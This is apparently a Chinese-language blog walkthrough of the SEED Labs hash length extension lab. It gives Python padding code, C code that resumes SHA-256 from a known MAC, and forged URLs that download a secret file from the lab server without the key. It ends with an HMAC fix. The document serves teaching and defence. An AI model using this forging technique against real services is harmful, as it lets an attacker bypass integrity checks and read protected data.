---
title: Hash Length Extension Attack Lab
abbrlink: 78f57b58
date: 2024-03-23 18:00:16
categories:
    - SeedLabs
tags:
    - SeedLabs
    - Hash Attack
    - Cryptography
---

## Introduction

当客户端和服务器通过互联网进行通信时，它们就可能会受到 MITM 攻击。攻击者可以拦截来自客户端的请求，修改数据并将修改后的请求发送到服务器。在这种情况下，服务器需要验证接收到的请求的完整性。验证请求完整性的标准方法是在请求上附加一个称为 MAC 的标记。

MAC 是由密钥和一条消息计算出来的，计算 MAC 的一个简单方法是对密钥（密钥只有客户端和服务端知道）和消息拼接后的字符串做单向哈希运算。这种方法会受到哈希长度拓展攻击，该攻击允许攻击者在不知道密钥的情况下修改消息，同时仍然能够基于修改后的消息生成有效的 MAC。

## Lab Environment

在这个实验中有一个服务器，客户端可以向服务器发送一系列命令，每个命令都需要附加一个基于密钥和命令计算的 MAC。服务器只有在 MAC 被成功验证后才会执行请求中的命令。

首先，我们需要在 /etc/hosts 文件中添加以下条目，来绑定 IP 地址和服务器域名。

```
10.9.0.80 www.seedlab-hashlen.com
```

服务器代码在 Labsetup/image_flask/app 文件夹中，它有两个目录。www 目录包含服务器代码，LabHome 目录包含一个秘密文件和用于计算 MAC 的密钥。

服务器接受以下命令：

-   lstcmd：列出 LabHome 文件夹中的所有文件
-   download：从 LabHome 目录返回指定文件的内容

客户端发送到服务器的典型请求如下所示。服务器需要传递一个 uid 参数。它使用 uid 从 LabHome/key.txt 获取 MAC 密钥。然后使用密钥和命令生成一个哈希值，就是后面附着的 MAC 值。

```
http://www.seedlab-hashlen.com/?myname=JohnDoe&uid=1001&lstcmd=1&mac=dc8788905dbcbceffcdd5578887717c12691b3cf1dac6b2f2bcfabc14a6a7f11
```

## Task 1: Send Request to List Files

我们发送的请求如下：

```
http://www.seedlab-hashlen.com/?myname=ceyewan&uid=1001&lstcmd=1&mac=8fc661f39b5215d0801daaaad73dfccc1bb723fad30a8abc2c0952018f300ad3
```

其中 MAC 字段是使用如下命令生成的，其中 123456 是 uid=1001 对应的密钥，然后将其与消息拼接，最后计算其哈希值。

```shell
echo -n "123456:myname=ceyewan&uid=1001&lstcmd=1" | sha256sum
```

发送结果如下：

![image-20240322222816381](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240322222816381.png)

发送下载命令：

```
http://www.seedlab-hashlen.com/?myname=ceyewan&uid=1001&lstcmd=1&download=secret.txt&mac=12b691e6f439e1e18e70dc35767543cef5ba0e34320c414c9d33f1d6c35504ae
```

![image-20240322175930115](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240322175930115.png)

>   这里我是使用 SSH 连接远程服务器的，那么也就说明我们的服务器没办法使用浏览器。执行 `ssh -L 8888:10.9.0.80:80 seed@192.168.2.3` 表示启动端口转发，将所有传入 8888 端口的连接转发到远程服务器的 IP 地址为 10.9.0.80，端口为 80 的目标主机。

## Task 2: Create Padding

SHA-256 的块大小是 64 字节，所以在哈希计算过程中，一条消息 m 将被填充为 64 字节的倍数。填充的第一个字节固定为 \x80，最后 8 个字节是 m 的长度（bit 长度），如果一个消息有 10 个字节，那么长度就是 80，并且使用大端序保存。

因此，我们原始的 message 是 "123456:myname=ceyewan&uid=1001&lstcmd=1"，我们构造 payload 如下：

```python
with open("file.bin", "r+b") as file:
    src_data = "123456:myname=ceyewan&uid=1001&lstcmd=1"
    data = b"\x80"
    data += b"\x00" * (64 - 8 - 1 - len(src_data))
    data += (len(src_data) * 8).to_bytes(8, byteorder='big')
    file.write(bytes(src_data, 'utf-8'))
    file.write(data)
    print(src_data, end='')
    for byte in data:
        print("%{:02x}".format(byte), end='')
```

这个脚本会将整个 64 字节的块存入 `file.bin` 并输出我们参数为 `123456:myname=ceyewan&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%38`，然后我们使用 `sha256sum file.bin` 得到这个块的哈希值 `262b9696f81c50290adc39360cbc4a282e313debee93b1330125a37ca4cab897`。最后我们构造的 URL 如下：

```
// URL 中需要将 \x80 转码为 %80 
http://localhost:8888/?myname=ceyewan&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%38&mac=262b9696f81c50290adc39360cbc4a282e313debee93b1330125a37ca4cab897
```

运行结果如下，提示说 MAC 是正确的，但是没有执行命令：

![image-20240322215109853](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240322215109853.png)

## Task 3: The Length Extension Attack

在这个任务中，我们将在不知道 MAC 密钥的情况下为 URL 生成一个有效的 MAC。假设我们知道一个有效请求 message 的 MAC，也知道 MAC 密钥的大小。我们的工作是在 message 的基础上伪造一个新的请求，并且计算一个有效的 MAC。

首先，我们使用 Task 1 中最开始那个 MAC，是 key:message 的哈希值。这个值的计算是 key:message 扩展后的大小为 64 字节的块的哈希值。然后我们将这个值填入如下的代码中：

```c
#include <arpa/inet.h>
#include <openssl/sha.h>
#include <stdio.h>
int main(int argc, const char *argv[]) {
  int i;
  unsigned char buffer[SHA256_DIGEST_LENGTH];
  SHA256_CTX c;
  SHA256_Init(&c);
  for (i = 0; i < 64; i++)
    SHA256_Update(&c, "*", 1);
  // MAC of the original message M (padded)
  c.h[0] = htole32(0x8fc661f3);
  c.h[1] = htole32(0x9b5215d0);
  c.h[2] = htole32(0x801daaaa);
  c.h[3] = htole32(0xd73dfccc);
  c.h[4] = htole32(0x1bb723fa);
  c.h[5] = htole32(0xd30a8abc);
  c.h[6] = htole32(0x2c095201);
  c.h[7] = htole32(0x8f300ad3);
  // 8fc661f3 9b5215d0 801daaaa d73dfccc 1bb723fa d30a8abc 2c095201 8f300ad3
  // Append additional message
  SHA256_Update(&c, "&download=secret.txt", 20);
  SHA256_Final(buffer, &c);
  for (i = 0; i < 32; i++) {
    printf("%02x", buffer[i]);
  }
  printf("\n");
  return 0;
}
```

这份代码在原有的哈希计算链后面加了一个块，就是 additional message，我们不需要知道 key 是什么，我们只需要知道前一个块的 MAC 值，拿来计算当前块的 MAC 值，结果就是最终的 MAC 块。

这样，message 就不是最后一个块了。我们需要将 message 块使用 payload 填充，这样 additional message 才会和 message 不在同一块，而是下一块。填充不需要知道 key 的内容，只需要知道 key:message 的长度，然后相应填充 64 - length 个字节即可。我们的这个填充不会改变 message 块计算出来的哈希值，因为使用的是和哈希算法相同的哈希值。

执行代码，最终的 MAC 值为 edd78a79d181d70f3b11be16bd27c6d21622a2e533bcfcd778915e4efcbe4f54，我们构造 URL 如下：

```
http://localhost:8888/?myname=ceyewan&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%38&download=secret.txt&mac=edd78a79d181d70f3b11be16bd27c6d21622a2e533bcfcd778915e4efcbe4f54
```

执行结果如下：

![image-20240322223200967](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20240322223200967.png)

## Task 4: Attack Mitigation using HMAC

将服务端 MAC 计算由下面方法一换成方法二，然后重新启动容器，输入 Task1 的命令，没有结果输出了。

```python
# 方法一，拼接后直接使用 sha256 算法。key 只会在第一个块参与
payload = key + ':' + message
real_mac = hashlib.sha256(payload.encode('utf-8', 'surrogateescape')).hexdigest()
# 方法二，不是使用拼接，而是构造一个 hmac 对象，key 可以全程参与计算，或者开头和结尾参与运算
real_mac = hmac.new(bytearray(key.encode('utf-8')), msg=message.encode(
        'utf-8', 'surrogateescape'), digestmod=hashlib.sha256).hexdigest()
```

这样，就无法进行攻击了，如下，使用的不是这种算法了。

```python
#!/bin/env python3
import os
import hmac
import hashlib
key = '123456'
message = 'myname=JohnDoe&uid=1001&lstcmd=1'
mac = hmac.new(bytearray(key.encode('utf-8')),
               msg=message.encode('utf-8', 'surrogateescape'),
               digestmod=hashlib.sha256).hexdigest()
print(mac)
os.system('echo -n "123456:myname=ceyewan&uid=1001&lstcmd=1" | sha256sum')

# output
➜  Hash python3 help.py
# 4a5cb2f7166c982b5bb87ffa7165c3e27aab2c39a44156d3185d10cdda4c8f5f
# 5cf8c4612fe49a09c61552e7453291f63df212ca76532946b7018266431af026  -
```

